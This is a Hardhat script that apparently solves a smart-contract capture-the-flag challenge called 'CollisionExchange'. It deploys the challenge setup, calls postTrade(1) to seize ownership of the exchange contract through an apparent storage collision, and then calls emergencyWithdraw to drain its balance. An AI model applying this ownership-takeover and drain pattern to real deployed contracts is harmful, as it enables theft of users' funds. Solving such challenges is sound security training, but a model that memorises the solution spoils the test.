// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const { parseEther } = require("ethers/lib/utils");

async function main() {
  

  //get accounts and verify balances
  //const [accounts] = await hre.ethers.getSigners();
  //console.log("Signer is: ", accounts.address);

  
  //set addresses for current challenge
  const setupAddress = "0x5e40D0d98126323b81246008d386a93BA091704f";
  const challengeAddress = "0xE442a00a4587677c945598e19DF41822e851c1DE";
  const challengeName = "CollisionExchange";
  const setupName = "SetupBackup";
  const orderBookName = "OrderBook";
  const orderBookAddress = "0x5CAF8Fa1f2a350A273cB7d6691f3c5Fcbc79C6B4";

  //get accounts and verify balances
  const [accounts,deployer] = await hre.ethers.getSigners();
  console.log("Signer is: ", accounts.address);
  console.log("Deployer is: ", deployer.address);

  
   // deploy setup contract
   const Setup = await hre.ethers.getContractFactory("Setup");
   const setup = await Setup.connect(deployer).deploy({ value: parseEther("1") });
   await setup.deployed();
   console.log("Setup deployed to:", setup.address);
 
   // verify challenge contract
   
   console.log("Orderbook Instance:", await setup.orderBook());
   console.log("Challenge Instance:", await setup.exchange());
   
    
  //verify unsolved
  console.log("Solved before ?: ", await setup.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance(setup.exchange()));


  //attach setup
  //const setupContract = await hre.ethers.getContractAt(setupName, setupAddress);
  //attach challenge
  //const challengeContract = await hre.ethers.getContractAt(challengeName, challengeAddress);
  const challengeContract = await hre.ethers.getContractAt(challengeName, setup.exchange());
  //attach orderBook
 // const orderBookContract = await hre.ethers.getContractAt(orderBookName, orderBookAddress);
  const orderBookContract = await hre.ethers.getContractAt(orderBookName, setup.orderBook());

  //verify unsolved
  console.log("Solved before ?: ", await setup.isSolved());
  console.log("Starting balance:", await ethers.provider.getBalance(setup.exchange()));

  //exploit logic
  
  console.log("Starting owner:", await challengeContract.owner());
  
  await challengeContract.postTrade(1);
  
  console.log("New owner:", await challengeContract.owner());
  
  //console.log("Trade :", await orderBookContract.getTrade());
  
  await challengeContract.emergencyWithdraw();
  

  //verify solved
  console.log("Solved after?: ", await setup.isSolved());
  

  
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
